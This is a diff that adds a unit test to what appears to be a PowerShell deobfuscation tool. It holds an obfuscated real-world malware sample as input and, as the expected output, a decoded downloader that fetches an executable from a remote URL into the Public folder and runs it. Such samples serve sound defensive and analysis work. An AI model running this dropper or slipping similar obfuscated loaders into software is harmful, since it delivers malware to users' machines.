@@ -541,3 +541,44 @@ class TestPs1RealWorldLarge(TestUnitBase):
             '''
         ).replace('[[URL]]', 'https:''//firedron''.top/uploads/IMG0065.jpg')
         self.assertIn(goal, test)
+
+    def test_real_world_05(self):
+        data = (
+            B"&( $enV:coMsPEC[4,24,25]-JOin'') ( (('((mB9r5PnmB9+mB9smB9+mB9amB9+mB9dasd = mB9+mB9&mB9+mB9(FzmB9+m"
+            B"B9rnFmB9+mB9zr+FzreFmB9+mB9zr'+'mB9+mB9+FzmB9+mB9rmB9+mB9w-mB9+mB9obmB9+mB9jmB9+mB9ec'+'FmB9+mB9zr+m"
+            B"B9+mB9FmB9+'+'mB9zrmB9+mB9tFzr) mB9+mB9ramB9+mB9ndom;r5mB9+mB9PmB9+mB9YYUmB9+mB9 mB9+mB9=mB9+mB9 .('"
+            B"+'mB9+mB9FzmB9+mB9rmB9+mB9neFzr+FzrmB9+mB9wmB9+mB9Fzr+Fzr-omB9+mB9bjectFzr) mB9+mB9'+'SymB'+'9+mB9sm"
+            B"B9+mB9temB9+mB9m.NetmB9+mB9.mB9+mB9WebCmB'+'9+mB9lienmB9+mB9t;mB9+'+'mB9r5mB9+mB9PmB9+mB9NSBmB9+'+'m"
+            B"B9 =mB9+mB9 r5mB9+mB9PmB9+mB9nsmB9+mB9amB9+mB9dasd.mB9+mB9nmB9+mB9emB9+mB9xt(mB9+mB9100mB9+mB90mB9+m"
+            B"B90mB'+'9+mB9,mB9+mB9 2mB9+mB982mB9+mB913mB9+mB9'+'3'+');r5PADCX = FzrmB9+mB9mB9+mB9http://tqwemB9+m"
+            B"B9651qmB9+mB9wmB9+mB9emB9+mB9qwemB'+'9+mB9qw.mB9+mB9comB9+mB9m/BUmB9+mB9RmB9+mB9/testv.pmB9+mB9hp?l="
+            B"mB9+mB9big9.yarnFmB9+mB9zr.SmB9+mB9pl'+'itmB9+mB9(mB9+mB9FmB9+mB9zmB9+mB9r@Fzr);rmB9+mB95PSDCmB'+'9+"
+            B"mB9 mB9+mB9= mB9+mB9r5Pe'+'nv:mB9+mB9pm'+'B9+mB9ublmB9+mB9icmB9+mB9 +mB9+mB9 mB9+mB9Fz'+'rOHmmB9+mB9"
+            B"Fzr + r5mB9+mB9PmB9+mB'+'9NSBmB9+mB9 + '+'('+'Fzr.emB9+mB9xFmB9+mB9zmB9+mB9r+FmB9+mB9zremB9+mB9FmB9+"
+            B"mB9zrmB9+mB9)mB9+mB9;mB9+mB9fmB9+mB9oreacmB9+mB9h(mB9+mB9r5PamB9+mB9sfc in r5mB9+mB9PA'+'DCXmB9+mB9)"
+            B"{try{r5PYYmB9+mB9U.9adD'+'om'+'B9+mB9JCdmB9+mB9WnlJCdOamB9+mB9dFmB'+'9+mB9IJ'+'Cdle9amB9+mB9dmB9+mB9"
+            B"(r5PasfmB9+mB9c.9mB9+mB9admB9'+'+m'+'B9ToStmB9+mB9rJmB9+mB9CdimB9'+'+mB9JCdNg'+'9amB9+mB9d()mB9+mB9,"
+            B"mB9+mB9 mB9+mB9rmB9+mB95PSDmB9+mB9C);&(FzrInvoFzr+FzrkFmB9+mB9zmB9+mB9r+mB9+mB9Fzre-mB9+mB9ImB9+mB9t"
+            B"emmB'+'9+mB9Fzr)(r5PSmB9+mB9DCmB9+mB9);breakmB'+'9+mB9;}catmB9+mB9cmB9+mB9hmB9+mB9{}mB9+mB9}mB9) -rE"
+            B"PLace mB9OHmmB9,[CHAR]92 -rEPLace([CHAR]114+[CHAR]53+[CHAR]80),[CHAR]36 -rEPLace mB9JCdmB9,[CHAR]96 "
+            B"-rEPLace ([CHAR]70+[CHAR]122+[CHAR]114),[CHAR]39-cRepLACe mB99admB9,[CHAR]34) BdZ. ((VaRIABle m'+'B9"
+            B"*mdr*mB9).naME[3,11,2]-JoiNmB9mB9)')-CrEPLaCe([ChAR]66+[ChAR]100+[ChAR]90),[ChAR]124 -RepLAce 'mB9',"
+            B"[ChAR]39) )"
+        )
+        test = data | self.load() | str
+        goal = inspect.cleandoc(
+            r'''
+            $nsadasd = New-Object Random
+            $YYU = New-Object System.Net.WebClient
+            $NSB = $nsadasd.next(10000, 282133)
+            $SDC = 'C:\Users\Public\' + $NSB + '.exe'
+            foreach ($asfc in '[[URL]]') {
+              try {
+                $YYU.DownloadFile($asfc.ToString(), $SDC)
+                Invoke-Item ($SDC)
+                break
+              } catch {}
+            }
+            '''
+        ).replace('[[URL]]', 'http:''//tqwe651''qweqweqw''.com/BUR/testv.php?l=big9.yarn')
+        self.assertIn(goal, test)
